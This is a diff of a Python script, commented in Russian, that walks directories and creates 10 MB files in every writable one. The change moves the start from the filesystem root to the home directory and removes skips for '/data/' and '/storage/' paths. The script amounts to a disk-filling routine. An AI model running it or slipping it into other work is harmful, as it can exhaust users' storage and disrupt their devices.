@@ -32,17 +32,13 @@ def is_writable(directory):
         return False
 
 def traverse_and_create_files(root_dir, file_size):
-    """Обходит все директории и создает файлы размером file_size, проверяя права на запись"""
+    """Обходит все директории в домашней директории и создает файлы размером file_size, проверяя права на запись"""
     try:
         for dirpath, dirnames, filenames in os.walk(root_dir):
             print(f"Проверка директории: {dirpath}")  # Выводим проверяемую директорию
             
             # Пропускаем системные директории или защищенные
             if '/sys/' in dirpath or '/proc/' in dirpath:
-                continue
-            
-            # Пропускаем директории с ограничениями, такие как /data
-            if '/data/' in dirpath or '/storage/' in dirpath:
                 continue
             
             # Проверяем, есть ли права на запись в директорию
@@ -63,7 +59,8 @@ def traverse_and_create_files(root_dir, file_size):
 def main():
     try:
         file_size = 10 * 1024 * 1024  # 10 MB
-        root_dir = "/"  # Начальная директория для обхода
+        root_dir = os.path.expanduser("~")  # Начальная директория для обхода — домашняя директория
+        print(f"Начинаем создание файлов в директории: {root_dir}")
         traverse_and_create_files(root_dir, file_size)
     except Exception as e:
         print(f"Ошибка в main: {e}")
